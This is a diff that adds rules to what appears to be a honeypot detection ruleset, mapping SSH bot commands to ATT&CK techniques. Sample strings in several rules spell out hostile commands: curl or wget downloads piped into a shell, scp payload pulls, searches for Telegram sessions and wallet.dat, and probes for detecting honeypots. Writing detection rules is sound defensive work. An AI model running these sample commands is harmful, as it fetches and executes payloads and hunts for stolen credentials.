@@ -142,6 +142,47 @@ rules:
     positive: ["nvidia-smi", "lspci | grep -i vga"]
     negative: ["lspci -v"]
 
+  - id: HL-DISC-015
+    regex: '^\s*/(ip|ipv6|interface)(\s+[a-z-]{1,24}){0,2}\s+print\b'
+    technique: T1016
+    tactic: discovery
+    confidence: medium
+    rationale: MikroTik RouterOS console commands such as "/ip cloud print" list the router's addresses and public DNS name. Bots try them on every SSH box in case it is a router.
+    positive: ["/ip cloud print", "/ip address print", "/interface print"]
+    negative: ["cat /ip/print", "ls /ip-tools/print.sh"]
+  - id: HL-DISC-016
+    regex: '^\s*/system\s+(resource|identity|routerboard|package|license)(\s+[a-z-]{1,24})?\s+print\b'
+    technique: T1082
+    tactic: discovery
+    confidence: medium
+    rationale: RouterOS "/system resource print" and friends report the router model, CPU and version (System Information Discovery).
+    positive: ["/system resource print", "/system routerboard print"]
+    negative: ["cat /system/resource.txt"]
+  - id: HL-DISC-017
+    regex: '(^|[;&|(`]\s{0,8})ps(\s+-{0,2}[a-zA-Z]{1,8}){0,3}\s*(\||;|&|$)'
+    technique: T1057
+    tactic: discovery
+    confidence: medium
+    rationale: A bare "ps" (often piped into grep for "miner") lists running processes, here to spot a rival cryptominer.
+    positive: ["ps | grep '[Mm]iner'", "ps", "ps -A | grep kworker"]
+    negative: ["cat ps", "maps -ef", "echo ps aux is fun"]
+  - id: HL-DISC-018
+    regex: 'TelegramDesktop/tdata|D877F783D5D3EF8C|/dev/ttyGSM|/dev/ttyUSB-mod|/var/spool/sms|/etc/smsd\.conf|\bqmuxd\b|/dev/modem'
+    technique: T1083
+    tactic: discovery
+    confidence: medium
+    rationale: Looking for Telegram Desktop session folders (tdata, D877F783D5D3EF8C) and GSM/SMS modem devices is file and directory discovery aimed at accounts to steal or SMS gateways to abuse.
+    positive: ["ls -la ~/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /var/spool/sms/*", "locate D877F783D5D3EF8Cs"]
+    negative: ["ls ~/.local/share/applications"]
+  - id: HL-DISC-019
+    regex: '(^|[;&|(]\s{0,8})(locate|mlocate|plocate)\s+[^\s;|]'
+    technique: T1083
+    tactic: discovery
+    confidence: low
+    rationale: locate searches the file-name index to find interesting files quickly (File and Directory Discovery).
+    positive: ["locate D877F783D5D3EF8Cs", "locate wallet.dat"]
+    negative: ["allocate memory", "relocate x"]
+
   # ---------------------------------------------------------------- Execution
   - id: HL-EXEC-001
     regex: '\b(sh|bash|ash|dash)\s+(-c\s+|[^;|\s]{1,120}\.sh\b)'
@@ -199,6 +240,14 @@ rules:
     rationale: IoT (Internet of Things) bots like Mirai call commands through busybox because cheap devices have nothing else.
     positive: ["busybox wget", "/bin/busybox ECCHI"]
     negative: ["busy box"]
+  - id: HL-EXEC-008
+    regex: '\b(wget|curl|tftp|ftpget|fetch)\b[^;]{0,300}\|\s*(ba)?sh\b'
+    technique: T1059.004
+    tactic: execution
+    confidence: high
+    rationale: A download tool whose output is piped straight into a shell fetches and runs a payload in one step (download-and-execute dropper).
+    positive: ["(wget --no-check-certificate -qO- https://192.0.2.10/sh || curl -sk https://192.0.2.10/sh) | sh -s ssh", "curl -fsSL http://198.51.100.7/i.sh | bash"]
+    negative: ["wget http://198.51.100.7/x; cat x | shuf", "curl --version"]
 
   # -------------------------------------------------------------- Persistence
   - id: HL-PERS-001
@@ -441,6 +490,22 @@ rules:
     rationale: HTTP POST from a shell is often a bot checking in with its controller over web protocols.
     positive: ["curl -X POST http://c2.invalid/reg -d id=1", "wget --post-data=a=1 http://x.test"]
     negative: ["curl http://x.test"]
+  - id: HL-C2-007
+    regex: '\bscp\b[^;|]{0,200}\s-i\s[^;|]{0,200}\s[A-Za-z0-9._-]{1,64}@[A-Za-z0-9.-]{1,253}:'
+    technique: T1105
+    tactic: command-and-control
+    confidence: high
+    rationale: scp with an identity file (-i, often a private key the bot just echoed into a file) pulling user@host:path copies the attacker's payload onto the host (Ingress Tool Transfer).
+    positive: ["scp -s -F sshcfg -i key.ppk dlr@192.0.2.5:sh out_sh"]
+    negative: ["scp -t /tmp/AbCd", "scp notes.txt user@198.51.100.4:/tmp/"]
+  - id: HL-C2-008
+    regex: '\bscp\s+(-[a-zA-Z]{1,6}\s+){0,4}-t\s'
+    technique: T1105
+    tactic: command-and-control
+    confidence: high
+    rationale: The command "scp -t" is the receiving end of an scp upload - the attacker is pushing a file onto the honeypot from their own machine.
+    positive: ["scp -t /tmp/9VyqwU5Z", "scp -r -t /tmp/x"]
+    negative: ["scp -i key file user@198.51.100.4:/tmp/"]
 
   # ----------------------------------------- Impact (Resource Hijacking)
   - id: HL-IMPACT-001
@@ -527,3 +592,19 @@ rules:
     rationale: Hex-escaped echo/printf strings hide binary payloads or signatures inside text (Obfuscation). Mirai variants also use it as a liveness probe.
     positive: ["echo -e '\\x67\\x61\\x79'", "printf '\\x41'"]
     negative: ["echo hello"]
+  - id: HL-STEALTH-009
+    regex: '===SHELL_BEHAVIOR===|(^|[;&|(\s])\./xxxxxx\b|(^|[;&|(\n]\s{0,8})xxxxxx\s*($|[;&|)])|echo\s+\\?["'']?xxxxxx\b|>\s*filter\s*&&\s*chmod\s+\+x\s+filter\s*&&\s*\./filter'
+    technique: T1497.001
+    tactic: stealth
+    confidence: high
+    rationale: The "shell behaviour" probe runs a made-up command (xxxxxx, ./xxxxxx) and a tiny script named filter, then compares the error messages and output with a real shell. Emulated shells such as honeypots answer differently, so this is a honeypot/sandbox check (System Checks).
+    positive: ["echo '===SHELL_BEHAVIOR==='", "./xxxxxx", "xxxxxx", 'printf "#!/bin/bash\necho \"xxxxxx\"\n" > filter && chmod +x filter && ./filter && rm -rf filter', '#!/bin/bash ⏎ echo "xxxxxx" ⏎ ']
+    negative: ["echo xxxxxxx_build", "cat xxxxxx.txt", "ls filter"]
+  - id: HL-STEALTH-010
+    regex: '\becho\s+["'']?[A-Za-z]{1,8}["'']?\s*\|\s*cat\s+-n\b'
+    technique: T1497.001
+    tactic: stealth
+    confidence: low
+    rationale: Piping a short word through "cat -n" checks that pipes and line numbering behave like a real shell - a cheap liveness/honeypot check seen from SSH bots.
+    positive: ["echo Hi | cat -n"]
+    negative: ["cat -n notes.txt"]
